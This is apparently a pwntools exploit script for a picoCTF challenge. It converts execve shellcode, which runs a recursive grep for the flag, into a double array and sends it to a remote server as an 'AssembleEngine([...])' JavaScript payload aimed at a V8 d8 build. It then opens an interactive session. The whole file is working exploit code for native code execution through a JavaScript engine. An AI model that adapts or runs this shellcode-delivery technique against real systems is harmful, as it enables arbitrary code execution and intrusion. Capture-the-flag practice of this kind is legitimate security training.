from pwn import *
import struct

context.log_level = 'debug'
elf = context.binary = ELF('./d8')

def uint64_t_to_double(num):
    return struct.unpack('d', struct.pack('Q', num))[0]

def double_to_uint64_t(num):
    return struct.unpack('Q', struct.pack('d', num))[0]

def shellcode_to_doublearray(shellcode: bytes) -> list[float]:
    shellcode = shellcode.ljust(8 * ((len(shellcode) + 7) // 8), b'\x90')
    return [uint64_t_to_double(u) for u in struct.unpack(f'{len(shellcode) // 8}Q', shellcode)]

def main():
    # our shellcode does an execve to /bin/grep -rni "picoCTF" /
    shellcode = asm(shellcraft.execve('/bin/grep', ['/bin/grep', '-rni', 'picoCTF'], 0))

    double_array = shellcode_to_doublearray(shellcode)

    # just check if we can recover the shellcode from the double array
    recovered = b''.join(struct.pack('Q', double_to_uint64_t(d)) for d in double_array)

    print(recovered)

    for i in range(len(shellcode)):
        assert recovered[i] == shellcode[i]

    io = remote('mercury.picoctf.net', 62123)
    # io = process('./server')

    io.recvuntil(b'5k:')

    payload = b'AssembleEngine(['
    for i in range(len(double_array)):
        payload += str(double_array[i]).encode('utf-8')
        if i != len(double_array) - 1:
            payload += b', '
    payload += b']);'

    payload_size = len(payload)
    io.sendline(str(payload_size).encode('utf-8'))

    io.recvuntil(b'please!!\n')
    io.sendline(payload)

    io.interactive()

main()
